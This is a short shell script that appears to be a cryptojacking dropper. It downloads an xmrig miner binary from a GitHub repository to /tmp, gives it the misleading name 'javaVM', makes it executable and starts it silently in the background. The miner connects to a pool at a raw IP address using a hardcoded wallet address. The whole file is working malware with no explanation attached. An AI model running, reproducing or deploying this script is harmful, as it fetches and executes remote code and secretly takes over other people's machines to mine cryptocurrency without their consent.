#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 5 --donate-level > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/xmrig -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k -t 5 --donate-level > /dev/null 2>&1 &
fi
